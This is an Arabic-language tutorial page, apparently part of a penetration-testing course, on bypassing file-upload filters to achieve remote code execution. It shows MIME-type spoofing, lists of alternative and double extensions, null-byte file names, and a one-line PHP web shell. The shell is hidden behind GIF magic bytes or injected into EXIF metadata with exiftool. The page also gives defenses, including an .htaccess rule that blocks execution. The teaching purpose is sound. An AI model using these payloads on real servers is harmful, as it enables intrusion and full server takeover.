@@ -1,0 +1,126 @@
+<div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #fbbf24;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📤</span> File Upload Bypass — تخطي فلاتر رفع الملفات</h2>
+    <p class="hero-tagline">منهجية رفع ملفات الـ Web Shell وتخطي فلاتر الامتداد ونوع الملف وحجمه للحصول على RCE</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Web Shells · Burp Suite · EXIF modification · Magic Bytes</span>
+      <span class="badge badge-info">📋 OWASP: Unrestricted File Upload | Remote Code Execution</span>
+      <span style="background: rgba(251,191,36,0.15); color: #fbbf24; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High → Critical (RCE)</span>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 2: THEORY — Vulnerability Mechanics ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — كيف تحدث ثغرات رفع الملفات غير المقيدة</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تحدث ثغرة **Unrestricted File Upload** عندما يسمح خادم الويب للمستخدمين برفع ملفات عشوائية إلى نظام الملفات الداخلي دون فلترة كافية لنوع الملف وامتداده وموقعه، ويسمح بتنفيذ هذه الملفات لاحقاً في المتصفح.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🔍 أنواع التحقق من الملفات (Filters Validation)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Client-Side Validation:</strong> فحص الامتداد بواسطة Javascript في المتصفح قبل إرسال الطلب (أسهل نوع للتخطي عبر Burp Suite).</li>
+            <li><strong>Extension Blacklisting:</strong> حظر امتدادات محددة (مثل <code>.php, .asp, .jsp</code>). يمكن تخطيه باستخدام امتدادات بديلة أو تلاعب بالحروف.</li>
+            <li><strong>MIME Type Validation:</strong> فحص ترويسة <code>Content-Type</code> في طلب الـ HTTP (مثال: <code>image/png</code>).</li>
+            <li><strong>Magic Bytes (File Signature):</strong> قراءة أول بضع بايتات من الملف للتأكد من بنيته الحقيقية (مثل بايتات GIF89a).</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🔥 الأثر الفعلي والـ Web Shell</h4>
+          <p>
+            الهدف النهائي للمهاجم هو رفع ملف **Web Shell** (كود برمجى بلغة السيرفر مثل PHP/ASP) يقبل الأوامر من خلال المتصفح وينفذها على نظام الخادم للوصول الكامل.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح طرق التخطي (Bypass Techniques) خطوة بخطوة</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">MIME Type &amp; Client-Side Bypass</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إيقاف كود الـ JS في المتصفح أو التقاط الطلب في Burp Suite وتغيير ترويسة الـ Content-Type لتبدو كصورة مقبولة:</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Original request header captured:
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+# Modify to look like image:
+Content-Type: image/png</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Blacklist Bypass &amp; Alternative Extensions</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استخدام امتدادات نادرة أو متوافقة يقبلها نظام الحماية بينما يترجمها السيرفر كملف قابل للتنفيذ:</p>
+            <ul style="color: var(--text-secondary); font-size: 0.85rem; line-height: 1.8; margin-top: 5px;">
+              <li><strong>PHP Alternatives:</strong> <code>.php3, .php4, .php5, .phtml, .phar</code></li>
+              <li><strong>ASP Alternatives:</strong> <code>.aspx, .cer, .asa</code></li>
+              <li><strong>Double Extensions:</strong> <code>shell.png.php</code> أو <code>shell.png.pHp5</code></li>
+              <li><strong>Null Byte Injection (Older servers):</strong> <code>shell.php%00.png</code></li>
+            </ul>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">Magic Bytes Bypass &amp; EXIF Injection</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إدراج الـ Magic Bytes للصور في أول سطر للملف لخدع فلتر الفحص البرمجى، أو حقن كود الـ PHP بالكامل داخل خانة التعليق لملف الصورة الفعلي (EXIF Metadata) ورفعها بصيغة صورة:</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Magic Bytes for GIF in the first line of PHP file:
+GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Inject using exiftool:
+exiftool -Comment="&lt;?php system(\$_GET['cmd']); ?&gt;" image.png
+mv image.png shell.php.png</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين رفع الملفات بالكامل</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ حماية الكود البرمجي ونظام التخزين</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Randomize File Names:</strong> تغيير اسم الملف المرفوع تلقائياً إلى قيمة عشوائية Hash (مثال: UUID) لقطع الطريق على المهاجم لمعرفة مسار الملف بعد الرفع.</li>
+          <li><strong>Storage Isolation:</strong> تخزين الملفات المرفوعة في سيرفر معزول تماماً أو خدمات تخزين سحابية (S3 / Storage buckets) بدلاً من استضافتها على خادم التطبيق الرئيسي.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تحصين الخوادم ومنع التنفيذ</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Non-Executable Permissions:</strong> إزالة صلاحيات التنفيذ (Execution Permissions) تماماً عن مجلد الرفع.</li>
+          <li><strong>Web Server Configuration:</strong> منع السيرفر من معالجة ملفات الرفع برمجياً. مثال بملف <code>.htaccess</code> لمجلد الرفع:</li>
+          <pre style="background: #282a36; padding: 10px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code># Disable script execution
+&lt;Files ~ "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$"&gt;
+  ForceType text/plain
+&lt;/Files&gt;</code></pre>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- MARK COMPLETE -->
+  <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p7')">
+    ✅ Mark Phase Complete — File Upload Done → Proceed to XSS Workflow
+  </button>
+
+</div>
